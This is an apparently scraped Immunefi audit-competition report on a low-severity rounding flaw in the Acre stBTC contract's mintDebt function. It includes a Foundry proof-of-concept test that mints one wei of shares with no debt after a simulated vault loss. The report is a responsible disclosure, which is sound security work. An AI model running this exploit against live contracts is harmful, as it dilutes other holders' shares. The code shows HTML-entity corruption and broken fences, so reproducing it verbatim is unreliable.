# #35014 \[SC-Low] incorrect rounding in mintdebt function might allow minimal shares dilution

## #35014 \[SC-Low] Incorrect rounding in mintDebt function might allow minimal shares dilution

**Submitted on Sep 2nd 2024 at 18:52:11 UTC by @nnez for** [**Audit Comp | Acre**](https://immunefi.com/audit-competition/boost-acre)

* **Report ID:** #35014
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://sepolia.etherscan.io/address/0x7e184179b1F95A9ca398E6a16127f06b81Cb37a3>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

### Description

## Description

The \`mintDebt\` function in the stBTC contract contains a vulnerability due to incorrect rounding when converting shares to assets. In certain situations, such as when the vault experiences a loss, this rounding error allows users to mint 1 wei of shares without any corresponding increase in assets.

The vulnerable code is in the \`mintDebt\` function:\
See: <https://github.com/thesis/acre/blob/main/solidity/contracts/stBTC.sol#L304-L331\\>
\`\`\`solidity function mintDebt( uint256 shares, address receiver ) public whenNotPaused returns (uint256 assets) { assets = convertToAssets(shares);

```
// Increase the debt of the debtor.
currentDebt[msg.sender] +&#x3D; assets;

// Check the maximum debt allowance of the debtor.
if (currentDebt[msg.sender] &gt; allowedDebt[msg.sender]) {
    revert InsufficientDebtAllowance(
        msg.sender,
        allowedDebt[msg.sender],
        currentDebt[msg.sender]
    );
}

// ... (rest of the function)
```

} \`\`\`

The issue arises when \`convertToAssets(1)\` returns 0 due to rounding down. This allows a user to mint 1 wei of shares without increasing their debt, bypassing the debt allowance check.

Example scenario:

1. The vault experiences a small loss (e.g., 0.1%).
2. An attacker calls \`mintDebt(1, address(this))\`.
3. Due to rounding, \`convertToAssets(1)\` returns 0.
4. The debt allowance check is bypassed since 0 is added to \`currentDebt\`.
5. 1 wei of shares is minted, increasing \`totalSupply\` without increasing \`totalAssets\`.

## Impact

The primary impact of this vulnerability is the potential for share dilution. By exploiting this rounding error, an attacker can incrementally increase the total supply of shares without a corresponding increase in total assets. This leads to a gradual decrease in the value of each share.

However, the overall impact is considered low due to several factors:

1. The dilution effect is minimal, requiring many transactions to create a material impact.
2. The stBTC contract implements non-fungible shares, meaning that shares minted through this function cannot be used to redeem underlying assets from the vault.

Despite the low impact, this vulnerability represents an unintended behavior in the contract and is technically valid. Therefore, it should be fixed to prevent any unexpected loss.

### Proof of Concept

### Proof-of-Concept

The following test demonstrates the example scenario, where the total supply increases by 1 after calling \`mintDebt(1, address(this))\`, while the total assets remain unchanged.

#### Steps

1. Create a new forge project, \`forge init --no-commit --no-git --vscode\`
2. Create a new test file and paste the below test
3. Run \`forge t --match-contract AcreBoostShortRoundingTest -vv\`
4. Observe that 1 wei of share is minted via \`mintDebt\` with no corresponding increment of total assets\
   \`\`\` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol"; import "forge-std/interfaces/IERC20.sol"; import "forge-std/interfaces/IERC4626.sol";

interface IStBTC{ function mintDebt(uint256 shares, address receiver) external returns(uint); function totalSupply() external view returns(uint); function totalAssets() external view returns(uint); }

interface IAllocater{ function allocate() external; function releaseDeposit() external; function depositBalance() external view returns(uint); }

contract AcreBoostShortRoundingTest is Test {

```
error DepositNotFound();

function setUp() public {
    vm.selectFork(
        vm.createFork(&quot;https://rpc.sepolia.org&quot;)
    );
}

address stBTC &#x3D; 0x7e184179b1F95A9ca398E6a16127f06b81Cb37a3;
address tBTC &#x3D; 0x517f2982701695D4E52f1ECFBEf3ba31Df470161;

function testShortRounding() public{
    deal(tBTC, address(this), 1e18);
    IERC20(tBTC).approve(stBTC, type(uint).max);
    IERC4626(stBTC).deposit(1e18, address(this));
    
    uint currentTotalSupply &#x3D; IERC4626(stBTC).totalSupply();
    uint currentTotalAsset &#x3D; IERC4626(stBTC).totalAssets();
    
    console.log(&quot;@&gt; Starting total asset and total supply&quot;);
    console.log(&quot;@&gt; total asset: %s&quot;, currentTotalAsset);
    console.log(&quot;@&gt; total supply %s&quot;, currentTotalSupply);

    // assertEq(currentTotalAsset, currentTotalSupply);
    console.log(&quot;@&gt; Simulate loss of 0.1%&quot;);
    uint loss &#x3D; currentTotalAsset*10/10_000;
    vm.prank(stBTC);
    IERC20(tBTC).transfer(address(0xdead), loss);

    currentTotalSupply &#x3D; IERC4626(stBTC).totalSupply();
    currentTotalAsset &#x3D; IERC4626(stBTC).totalAssets();
    console.log(&quot;@&gt; total asset: %s&quot;, currentTotalAsset);
    console.log(&quot;@&gt; total supply %s&quot;, currentTotalSupply);
    
    console.log(&quot;@&gt; mintDebt for 1 wei of share&quot;);
    IStBTC(stBTC).mintDebt(1, address(this));

    currentTotalSupply &#x3D; IERC4626(stBTC).totalSupply();
    currentTotalAsset &#x3D; IERC4626(stBTC).totalAssets();
    
    console.log(&quot;@&gt; Only total supply is incremented, diluting share&#x27;s value&quot;);
    console.log(&quot;@&gt; total asset: %s&quot;, currentTotalAsset);
    console.log(&quot;@&gt; total supply %s&quot;, currentTotalSupply);
    
}
```

} \`\`\`
